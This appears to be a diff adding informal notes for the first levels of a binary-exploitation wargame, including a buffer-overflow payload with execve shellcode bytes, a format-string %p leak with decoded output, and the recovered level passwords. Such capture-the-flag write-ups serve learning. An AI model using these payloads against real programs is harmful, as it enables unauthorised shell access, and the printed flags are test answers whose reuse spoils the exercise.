@@ -1,0 +1,124 @@
+===========
+LEVEL00
+===========
+this ones easy. find cmp in disas main, there's a cmp with hex value which is decimal 5276
+when propted enter 5276 as passwd and you get the level1 shell;
+
+cat /home/users/level01/.pass
+
+uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
+
+
+===========
+LEVEL01
+===========
+
+checking functions, no syscall, it's shellcode time
+
+info vars -> 0x0804a040  a_user_name
+
+cat binary and find all non encoded shit to try for username, 
+"dat_wil" works
+
+
+use maxonchiks method to find the offset for buff overflow, 80
+
+so the line be: "dat_wil" + (shellcode + "\n" + garbage to get to 80) + shellcode addr
+
+shellcode addr = beginning of memory for vars, that being the beginning of "dat_will" + 7 => 0x0804a040 + 7
+
+shellcode: http://shell-storm.org/shellcode/files/shellcode-827.php
+
+
+
+checkity check:
+
+python -c "print 'dat_wil' + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + '\n' + 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac' + '\x08\x04\xa0\x47'[::-1]" > /tmp/pepe
+
+cat /tmp/pepe - | ./level01
+
+cat /home/users/level02/.pass
+
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+
+===========
+LEVEL02
+===========
+
+with ltrace we find that the file opens passwd.
+
+the thing uses fgets to read input, strncmp to check passwd, probably checking it against the actual flag since ltrace shows attempt to read exactly that.
+
+printf is used for printing the 
+
+> pepe does not have access!
+
+line, meaning it takes username as arg, so let's play with that, feeding it some %p
+
+now lets see where this thing reads in disas main:
+
+   0x00000000004008e6 <+210>:	lea    -0xa0(%rbp),%rax //create buff for reading 0xa0 = 160 in dec
+...
+   0x00000000004008fe <+234>:	mov    %rax,%rdi //into the rax 
+   0x0000000000400901 <+237>:	callq  0x400690 <fread@plt> //we read
+
+https://man7.org/linux/man-pages/man3/printf.3.html
+ Format of the format string
+check here what da $ doin, basically at allows to get to a place we need in buff for our purposes;
+
+$rsp - the stack pointer here. it's size: 
+	   0x0000000000400818 <+4>:	sub    $0x120,%rsp
+0x120 = 288
+
+meaning we take 160 bytes out of 288 sized stack, thus buff beginning at 288 - 160
+%p will move 8 bytes per step (ptr size == 8 in x64 systems)
+thus to print the right bit of stack with passwd we start at (288 - 160) / 8
+
+
+however this is all some github shit
+
+
+lets do our way eh?
+
+why not spam %p 30 times and see what we get
+
+
+11112222333%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+
+
+111122223330x7fffffffe4b0(nil)0x6b0x2a2a2a2a2a2a2a2a0x2a2a2a2a2a2a2a2a0x7fffffffe6a80x1f7ff9a080x6b6b6b(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)0x100000000(nil)0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d(nil)0x32323232313131310x25702570253333330x2570257025702570 does not have access!
+
+lets reverse the shit and see what we get
+
+we check the stuff between nils, notice that reversed 0x2a = '*' and other shit from input, somewhere we will find our buff. but in between we see 
+
+0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d
+
+lets separate them and use .decode() method in python (in vm btw lol)
+
+but instead of hello world obviously our shit
+so we have 
+
+0x756e505234376848
+0x45414a3561733951
+0x377a7143574e6758
+0x354a35686e475873
+0x48336750664b394d
+
+
+>>> a = "756e505234376848".decode("hex")[::-1]
+>>> print(a)
+Hh74RPnu
+
+and so on gives us 
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+lol it works
+
+
+
+===========
+LEVEL03
+===========
